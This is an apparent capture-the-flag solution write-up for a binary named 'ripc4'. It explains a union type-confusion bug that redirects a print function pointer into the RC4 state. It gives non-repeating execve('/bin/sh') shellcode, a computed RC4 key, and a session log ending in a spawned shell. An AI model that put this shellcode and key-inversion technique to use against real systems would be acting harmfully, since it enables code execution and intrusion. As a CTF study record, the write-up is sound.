@@ -1,0 +1,57 @@
+A bug in the program (by way of the state union) allows for confusion between
+the print function pointer and the RC4 state.
+
+By chosing an encrypted type, then setting a special key, then calling
+print execution will jump into the 256 bytes of RC4 state.
+
+The challenge is to find a key that will permute the RC4 state into
+useful shellcode.
+
+The main restriction is that RC4 state is a permutation of 0 .. 255 so
+each byte can only appear once in the shellcode.  The following x86_64
+does not repeate any byte:
+
+    BITS 64
+    xor esi, esi
+    push rsi
+    mov rbx, 0x0068732f6e69622e
+    or bl, 0x1
+    push rbx
+    push rsp
+    pop rdi
+    imul esi
+    mov al, 0x3b
+    syscall
+
+$ nasm -o sc.bin shellcode.asm
+$ ndisasm sc.bin
+00000000  31F6              xor si,si
+00000002  56                push si
+00000003  48                dec ax
+00000004  BB2E62            mov bx,0x622e
+00000007  696E2F7368        imul bp,[bp+0x2f],word 0x6873
+0000000C  0080CB01          add [bx+si+0x1cb],al
+00000010  53                push bx
+00000011  54                push sp
+00000012  5F                pop di
+00000013  F7EE              imul si
+00000015  B03B              mov al,0x3b
+00000017  0F05              syscall
+
+The perl script rc4_state_to_key.pl will perform the inverse RC4 key schedule to
+solve for a specific key from a specific state.
+
+$ ./rc4_state_to_key.pl
+key: 31c45eef6f6e2e00fdb83aeabd423d1c4df0f985e3ad75a420b800e6e5e4e3e2e1e0dfdedddcdbdad9d8d7d6d5d4e9f8d1f5cfcecdcccbcac9c8c7ebc5c4c3c2c1c0bfbebdbcbbbafeb8b7b6b5b4b3b2b1b0aff1f0acffaaa9a8a7a6a5a4a3efa1a0fb9e9d9c9b9af6fa97969594f99291908ff78d8c8b8a8988878685848382f4807f7e7d7c7b7a797877767574737271706f6e6d6c6b6a696867666564636261605f5e5d5c5b5a5958575655545352ec504f4e4d4c4b4a494847fd4544434241403f3e3d3c3b3a393837f33534333231302f2e2d2c2b2a292827262524232221201f1e1d1c1b1a191817161514ed1211100f0e0d0ceaee09080706050403e8
+
+Using that key:
+
+./ripc4
+type (plain, encoded, encrypted)> encryptedset_input   : Set the input value
+set_key     : Set the RC4 key.command> set_key
+key (hex)> 31c45eef6f6e2e00fdb83aeabd423d1c4df0f985e3ad75a420b800e6e5e4e3e2e1e0dfdedddcdbdad9d8d7d6d5d4e9f8d1f5cfcecdcccbcac9c8c7ebc5c4c3c2c1c0bfbebdbcbbbafeb8b7b6b5b4b3b2b1b0aff1f0acffaaa9a8a7a6a5a4a3efa1a0fb9e9d9c9b9af6fa97969594f99291908ff78d8c8b8a8988878685848382f4807f7e7d7c7b7a797877767574737271706f6e6d6c6b6a696867666564636261605f5e5d5c5b5a5958575655545352ec504f4e4d4c4b4a494847fd4544434241403f3e3d3c3b3a393837f33534333231302f2e2d2c2b2a292827262524232221201f1e1d1c1b1a191817161514ed1211100f0e0d0ceaee09080706050403e8
+Key has been set.set_input   : Set the input value
+set_key     : Set the RC4 key.command> print
+$ id
+uid=1000(david) gid=1000(david) groups=1000(david),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),107(kismet),109(netdev),111(lpadmin),118(bluetooth),119(scanner),127(vboxusers),129(wireshark),131(libvirt),133(libvirt-qemu),999(docker)
+
